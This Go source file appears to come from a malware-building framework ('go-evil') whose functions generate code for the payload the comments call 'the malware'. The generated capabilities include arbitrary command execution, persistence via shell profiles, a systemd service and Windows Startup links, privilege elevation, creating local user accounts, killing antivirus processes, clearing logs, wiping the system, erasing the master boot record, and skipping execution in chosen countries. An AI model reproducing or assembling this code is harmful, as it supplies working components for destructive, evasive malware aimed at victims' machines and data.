package system

import (
	"fmt"
	"strings"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

//
//
// Exits the malware
//
//
func Exit(s_json string, return_code string) ([]string, string) {
	data_object := structure.Receive(s_json)

	function_call := "Exit"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr_1 []int){", function_call),
		"lvl := spine.variable.get(spine.alpha.construct_string(repr_1))",
		"value := tools.String_to_int(lvl)",
		"os.Exit(value)",

		"}"})

	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
	data_object.Add_go_import("os")

	parameter_1 := tools.Generate_int_array_parameter(return_code)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
}

//
//
// Prints a message to the screen
//
//
func Out(s_json string, msg string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Out"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(msg []int){", function_call),
		"s_msg := spine.variable.get(spine.alpha.construct_string(msg))",
		"fmt.Print(s_msg)",
		"}"})

	data_object.Add_go_import("fmt")

	// Construct our int array
	parameter := tools.Generate_int_array_parameter(msg)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
}

//
//
// Prints a message to the screen, but appends a newline at the end of each print
//
//
func Outln(s_json string, msg string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Outln"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(msg []int){", function_call),
		"s_msg := spine.variable.get(spine.alpha.construct_string(msg))",
		"fmt.Println(s_msg)",
		"}"})

	data_object.Add_go_import("fmt")

	// Construct our int array
	parameter := tools.Generate_int_array_parameter(msg)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
}

//
//
// Executes a command on the running OS and prints the result
//
//
func Exec(s_json string, cmd string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Exec"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr []int){", function_call),
		"cmd := spine.alpha.construct_string(repr)",
		"cmd = spine.variable.get(cmd)",
		"split_cmd := strings.Split(cmd, \" \")",
		"cmd = strings.ReplaceAll(split_cmd[0], \"\\\"\", \"\")",
		"args := strings.ReplaceAll(strings.Join(split_cmd[1:], \" \"), \"\\\"\", \"\")",
		"out, err := exec.Command(cmd, args).Output()",
		"if err != nil {",
		"fmt.Println(err.Error())",
		"}else{",
		"fmt.Println(string(out[:]))",
		"}}"})

	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("fmt")
	data_object.Add_go_import("strings")

	// Construct our int array
	parameter := tools.Generate_int_array_parameter(cmd)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
}

//
//
// Disables boot of the program in certain countries
// The countries are determined by value returned by jibber_jabber, formatted in ISO 639
//
//
func Abort(s_json string, languages string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Abort"

	arr := structure.Create_evil_object(languages)

	arr.Uppercase()                          // Makes the contents of the array to uppercase
	language_array := arr.To_string("array") // Returns []string{<content>}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(languages []string){", function_call),
		"computer_lang, err := jibber_jabber.DetectTerritory()",
		"if err != nil {",
		"spine.log(err.Error())",
		"return",
		"}",
		"for _, lang := range languages{",
		"if lang == computer_lang{",
		"os.Exit(0)",
		"}}}"})

	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/cloudfoundry/jibber_jabber")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	return []string{fmt.Sprintf("%s(%s)", function_call, language_array)}, structure.Send(data_object)
}

//
//
// Reboots the computer
//
//
func Reboot(s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Reboot"

	cmd := ""
	if data_object.Target_os == "windows" {
		cmd = "shutdown /r"
	} else {
		cmd = "shutdown -r now"
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),

		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
		"}"})

	data_object.Add_go_import("os/exec")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)

}

//
//
// Shutdowns the computer
//
//
func Shutdown(s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Shutdown"

	cmd := ""
	if data_object.Target_os == "windows" {
		cmd = "shutdown /s"
	} else {
		cmd = "shutdown -h now"
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),

		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
		"}"})

	data_object.Add_go_import("os/exec")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}

//
//
// Add the malware to startup
//
//
func Add_to_startup(s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Add_startup"

	body := []string{fmt.Sprintf("func %s(){", function_call)}

	if data_object.Target_os == "windows" {
		body = append(body, "malware_path, _ := spine.path",
			"os.Link(malware_path, \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")",
			"os.Link(malware_path, \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")")

	} else {
		body = append(body,
			"malware_path, _ := os.Executable()",

			"for _, line := range []string{\"/etc/profile\", \"~/.bash_profile\", \"~/.bash_login\", \"~/.profile\", \"/etc/rc.local\"} {",
			"in, err := os.OpenFile(line, os.O_APPEND|os.O_WRONLY, 0644)",
			"if err != nil {",
			"spine.log(err.Error())",
			"return",
			"}",
			"in.WriteString(\"sudo .\" + malware_path + \" &\")",
			"}",

			"in, err := os.Create(\"/lib/systemd/system/tcp.service\")",
			"if err != nil {",
			"spine.log(err.Error())",
			"return",
			"}",

			"write := bufio.NewWriter(in)",
			"what_to_write := []string{",
			"\"[Unit]\",",
			"\"Description=My Sample Service\",",
			"\"After=multi-user.target\",",

			"\"[Service]\",",
			"\"Type=idle\",",
			"fmt.Sprintf(\"ExecStart=%s\", spine.path),",

			"\"[Install]\",",
			"\"WantedBy=multi-user.target\",",
			"}",
			"for _, line := range what_to_write {",
			"write.WriteString(line)",
			"}",
			"exec.Command(\"sudo\", \"systemctl\", \"enable\", \"tcp.service\").Run()",
			"exec.Command(\"sudo\", \"systemctl\", \"start\", \"tcp.service\").Run()")

		data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
	}

	body = append(body, "}")
	data_object.Add_go_function(body)

	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("bufio")
	data_object.Add_go_import("os")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}

//
//
// Writes a provided content to a provided file
//
//
func write(s_json string, value string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Write"

	arr := structure.Create_evil_object(value)
	path := arr.Get(0)
	data := strings.Join(arr.Get_between(1, arr.Length()), " ")

	if data_object.Check_global_name(data) { // Checks if what we got is a global variable
		data = tools.Erase_delimiter(data, []string{"\""}, -1)
	} else {
		data = fmt.Sprintf("\"%s\"", data)
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr_1  []int, repr_2 []int){", function_call),
		"path := spine.alpha.construct_string(repr_1)",
		"path = spine.variable.get(path)",

		"content := spine.alpha.construct_string(repr_2)",
		"content = spine.variable.get(content)",

		"file, err := os.Create(path)",
		"if err != nil{",
		"spine.log(err.Error())",
		"return",
		"}",

		"defer file.Close()",
		"result := tools.Starts_with(content, []string{\"[HEX];\"})",
		"if ok := result[\"[HEX];\"]; !ok {",
		"file.WriteString(content)",
		"}else{",
		"split := strings.Split(content, \",\")",
		"for _, data := range split {",
		"data, _ := hex.DecodeString(data)",
		"file.Write(data)",
		"}}}",
	})

	data_object.Add_go_import("encoding/hex")
	data_object.Add_go_import("os")
	data_object.Add_go_import("strings")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	parameter_path := tools.Generate_int_array_parameter(path)
	parameter_data := tools.Generate_int_array_parameter(data)

	return []string{fmt.Sprintf("%s(%s, %s)", function_call, parameter_path, parameter_data)}, structure.Send(data_object)
}

//
//
// Reads the contents of a file and places the result into a runtime variable
//
//
func read(s_json string, value string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "read"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr []int){", function_call),
		"path := spine.alpha.construct_string(repr)",
		"path = spine.variable.get(path)",
		"gut, err := ioutil.ReadFile(path)",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"spine.variable.set(string(gut))",
		"}"})

	data_object.Add_go_import("io/ioutil")

	// Construct our int array
	parameter := tools.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)

}

//
//
// Reads the contents of a directory and places the result into a runtime variable
//
//
func list_dir(s_json string, value string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "list_dir"
	arr := structure.Create_evil_object(value)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(config []string){", function_call),
		"if len(config) < 2{",
		"spine.log(\"The provided evil array does not contain all required values\")",
		"return",
		"}",
		"obj_type := spine.variable.get(config[0])",
		"path := spine.variable.get(config[1])",
		"result, err := ioutil.ReadDir(path)",
		"if err == nil{",
		"evil_array := \"${\"",
		"for _, file := range result{",
		"if obj_type == \"file\" && !file.IsDir() || obj_type == \"dir\" && file.IsDir() || obj_type == \"\" {",
		"evil_array += fmt.Sprintf(\"\\\"%s/%s\\\",\", path, file.Name())",
		"}",
		"}",
		"evil_array += \"}$\"",
		"spine.variable.set(evil_array)",
		"}}"})

	data_object.Add_go_import("io/ioutil")
	data_object.Add_go_import("fmt")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	return []string{fmt.Sprintf("%s(%s)", function_call, arr.To_string("array"))}, structure.Send(data_object)

}

//
//
// Takes a user input and saves the result in a runtime variable
//
//
func input(s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "input"
	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"var input string",
		"fmt.Scanln(&input)",
		"spine.variable.set(input)",
		"}"})

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)

}

//
//
// Removes the target file and folder if they are empty
//
//
func remove(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "remove"
	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr []int){", function_call),
		"target := spine.alpha.construct_string(repr)",
		"target = spine.variable.get(target)",
		"err := os.Remove(target)",
		"if err != nil{",
		"spine.log(err.Error())",
		"return",
		"}",
		"}"})

	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	// Construct our int array
	parameter := tools.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)

}

//
//
// Moves the target file to it's new location
//
//
func move(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "move"

	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Obtained evil array had size %d, but 2 was requested", arr.Length()), "system.move()")
	}

	old_path := arr.Get(0)
	new_path := arr.Get(1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(old_repr []int, new_repr []int){", function_call),
		"old_path := spine.alpha.construct_string(old_repr)",
		"old_path = spine.variable.get(old_path)",

		"new_path := spine.alpha.construct_string(new_repr)",
		"new_path = spine.variable.get(new_path)",

		"err := os.Rename(old_path, new_path)",

		"if err != nil{",
		"spine.log(err.Error())",
		"return",
		"}",
		"}"})

	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	// Construct our int array
	old_parameter := tools.Generate_int_array_parameter(old_path)

	// Construct our int array
	new_parameter := tools.Generate_int_array_parameter(new_path)

	return []string{fmt.Sprintf("%s(%s, %s)", function_call, old_parameter, new_parameter)}, structure.Send(data_object)

}

//
//
// Copies the target file to the new provided location
//
//
func copy(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "copy"

	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Obtained evil array had size %d, but 2 was requested", arr.Length()), "system.move()")
	}

	old_path := arr.Get(0)
	new_path := arr.Get(1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(old_repr []int, new_repr []int){", function_call),
		"old_path := spine.alpha.construct_string(old_repr)",
		"old_path = spine.variable.get(old_path)",

		"new_path := spine.alpha.construct_string(new_repr)",
		"new_path = spine.variable.get(new_path)",

		"src, err := os.Open(old_path)",
		"if err != nil{",
		"spine.log(err.Error())",
		"return",
		"}",

		"dst, err := os.Create(new_path)",
		"if err != nil{",
		"spine.log(err.Error())",
		"return",
		"}",

		"_, err = io.Copy(dst, src)",

		"if err != nil{",
		"spine.log(err.Error())",
		"}",

		"}"})

	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	// Construct our int array
	old_parameter := tools.Generate_int_array_parameter(old_path)
	new_parameter := tools.Generate_int_array_parameter(new_path)

	return []string{fmt.Sprintf("%s(%s, %s)", function_call, old_parameter, new_parameter)}, structure.Send(data_object)
}

//
//
// Changes the background to what you want it to be
//
//
func change_background(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "change_background"

	body := []string{fmt.Sprintf("func %s(repr_path []int){", function_call), "image_path := spine.alpha.construct_string(repr_path)", "image_path = spine.variable.get(image_path)"}

	switch data_object.Target_os {
	case "windows":
		body = append(body, "script :=", "fmt.Sprintf(\"$imgPath=\\\"%s\\\"\", image_path)\n")
		body = append(body, "script += `\n$code = @'", "using System.Runtime.InteropServices;", "namespace Win32{")
		body = append(body, "public class Wallpaper{", "[DllImport(\"user32.dll\", CharSet=CharSet.Auto)]", "static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni);")
		body = append(body, "public static void SetWallpaper(string thePath){", "SystemParametersInfo(20,0,thePath,3);", "}}}", "'@", "add-type $code", "[Win32.Wallpaper]::SetWallpaper($imgPath)")
		body = append(body, "`")
		body = append(body, "user := tools.Grab_username()")

		body = append(body, "content := []byte(script)", "ioutil.WriteFile(fmt.Sprintf(\"C:/Users/%s/AppData/Local/Temp/the_trunk.ps1\", user), content, 0644)")
		body = append(body, "err := exec.Command(\"powershell\", fmt.Sprintf(\"C:/Users/%s/AppData/Local/Temp/the_trunk.ps1\", user)).Run()", "if err != nil{", "spine.log(err.Error())", "}")

		data_object.Add_go_import("io/ioutil")
		data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")

	default:
		body = append(body, "targets := []string{\"gnome\", \"cinnamon\", \"kde\", \"mate\", \"budgie\", \"lxqt\", \"xfce\", \"deepin\"}")
		body = append(body, "for _, target := range targets{", "complete_string := fmt.Sprintf(\"gsettings set org.%s.desktop.background picture-uri file://%s\", target, image_path)")
		body = append(body, "final_target := strings.Split(complete_string, \" \")")
		body = append(body, "err := exec.Command(final_target[0], final_target[1:]...).Run()", "if err != nil{", "spine.log(err.Error())", "continue", "}", "}")

		data_object.Add_go_import("strings")

	}
	body = append(body, "}")
	data_object.Add_go_function(body)
	data_object.Add_go_import("fmt")

	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	// Construct our int array
	parameter := tools.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
}

//
//
// Tries to do a so-called "regular" elevation of the malwares priviliges
//
//
func elevate(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "elevate"
	body := []string{fmt.Sprintf("func %s(){", function_call), "if spine.is_admin{", "spine.log(\"Malware is already elevated\")", "return", "}"}

	if data_object.Target_os == "windows" {
		body = append(body, "out, err := exec.Command(\"runas\", \"/user:administrator\", spine.path).Output()")

	} else {
		body = append(body, "out, err := exec.Command(\"sudo\", spine.path).Output()")
	}

	body = append(body, "if err != nil{", "spine.log(err.Error())", "return", "}", "spine.variable.set(string(out))")

	body = append(body, "}")

	data_object.Add_go_function(body)

	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")
	data_object.Add_go_import("os")
	data_object.Add_go_import("os/exec")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)

}

//
//
// Creates a user on the local machine
// Input, an evil array in the following format ${"username", "password"}$
//
//
func create_user(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "create_user"

	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Obtained evil array had size %d, but 2 was requested", arr.Length()), "system.create_user()")
	}

	body := []string{fmt.Sprintf("func %s(repr_1 []int, repr_2 []int){", function_call),
		"param_1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
		"param_2 := spine.variable.get(spine.alpha.construct_string(repr_2))",
		"command := \"\"",
	}

	switch data_object.Target_os {
	case "windows":
		body = append(body, "command = fmt.Sprintf(\"net user %s %s /ADD\", param_1, param_2)")

	default: // nix systems
		body = append(body, "command = fmt.Sprintf(\"useradd -p %s %s\", param_2, param_1)")
	}

	body = append(body, []string{
		"split_command := strings.Split(command, \" \")",
		"cmd := exec.Command(split_command[0], split_command[1:]...)",
		"_, err := cmd.CombinedOutput()",
		"if err != nil {",
		"spine.log(err.Error())",
		"}}"}...)

	data_object.Add_go_function(body)
	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("strings")

	parameter_1 := tools.Generate_int_array_parameter(arr.Get(0))
	parameter_2 := tools.Generate_int_array_parameter(arr.Get(1))

	return []string{fmt.Sprintf("%s(%s, %s)", function_call, parameter_1, parameter_2)}, structure.Send(data_object)
}

//
//
// Tries to terminate a process based on it's pid
// Input must therefore be the pid to utilize
//
//
func kill_process_id(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "kill_process_id"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr_1 []int){", function_call),
		"value1 := tools.String_to_int(spine.variable.get(spine.alpha.construct_string(repr_1)))",
		"err := coldfire.PkillPid(value1)",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"}"})

	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	parameter_1 := tools.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
}

//
//
// Tries to terminate a process based on it's name
// Input must therefore be the name to utilize
//
//
func kill_process_name(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "kill_process_name"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr_1 []int){", function_call),
		"value1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
		"err := coldfire.PkillName(value1)",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"}"})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	parameter_1 := tools.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
}

//
//
// Tries to terminate the most common antiviruses
//
//
func kill_antivirus(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "kill_antivirus"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"err := coldfire.PkillAv()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"}"})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}

//
//
// Tries to clear known logs on the system
//
//
func clear_logs(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "clear_logs"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"err := coldfire.ClearLogs()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"}"})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}

//
//
// Tries to wipe the entire system
//
//
func wipe_system(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "wipe_system"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"err := coldfire.Wipe()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"}"})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}

//
//
// Tries to wipe the mbr
// Input is an evil array with the following format, ${"device", "erase partition table? (true/false)"}$
//
//
func wipe_mbr(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "wipe_mbr"
	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Obtained evil array had size %d, but 2 was requested", arr.Length()), "system.move()")
	}

	device := arr.Get(0)
	wipe_partition_table := tools.String_to_boolean(arr.Get(1))

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr_1 []int, repr_2 bool){", function_call),
		"value1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
		"err := coldfire.EraseMbr(value1, repr_2)",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"}"})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	parameter_1 := tools.Generate_int_array_parameter(device)

	return []string{fmt.Sprintf("%s(%s, %t)", function_call, parameter_1, wipe_partition_table)}, structure.Send(data_object)
}

//
//
// Tries to grab all disks
// Input None
// The return is an evil array containing all found disks which is placed in a runtime variable
//
//
func get_disks(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "get_disks"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"disks, err := coldfire.Disks()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"arr := structure.Create_evil_object(\"\")",
		"for _, d_disk := range disks{",
		"arr.Append(d_disk)",
		"}",
		"spine.variable.set(arr.To_string(\"evil\"))",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}

//
//
// Tries to grab all users
// Input None
// The return is an evil array containing all found users which is placed in a runtime variable
//
//
func get_users(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "get_users"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"users, err := coldfire.Users()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"arr := structure.Create_evil_object(\"\")",
		"for _, d_user := range users{",
		"arr.Append(d_user)",
		"}",
		"spine.variable.set(arr.To_string(\"evil\"))",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}

//
//
// Tries to grab all processes
// Input None
// The return is an evil array containing all found users which is placed in a runtime variable
//
//
func get_processes(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "get_processes"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"processes, err := coldfire.Processes()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"arr := structure.Create_evil_object(\"\")",
		"for pid, value := range processes{",
		"arr.Append(fmt.Sprintf(\"%d - %s\", pid, value))",
		"}",
		"spine.variable.set(arr.To_string(\"evil\"))",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")
	data_object.Add_go_import("fmt")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}

//
//
// Tries to grab all process names
// Input None
// The return is an evil array containing all found users which is placed in a runtime variable
//
//
func get_processes_name(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "get_processes_names"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"processes, err := coldfire.Processes()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"arr := structure.Create_evil_object(\"\")",
		"for _, value := range processes{",
		"arr.Append(value)",
		"}",
		"spine.variable.set(arr.To_string(\"evil\"))",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}

//
//
// Tries to grab all process id (pid)
// Input None
// The return is an evil array containing all found users which is placed in a runtime variable
//
//
func get_processes_pid(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "get_processes_pid"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"processes, err := coldfire.Processes()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"arr := structure.Create_evil_object(\"\")",
		"for pid, _ := range processes{",
		"arr.Append(fmt.Sprintf(\"%d\", pid))",
		"}",
		"spine.variable.set(arr.To_string(\"evil\"))",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")
	data_object.Add_go_import("fmt")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}
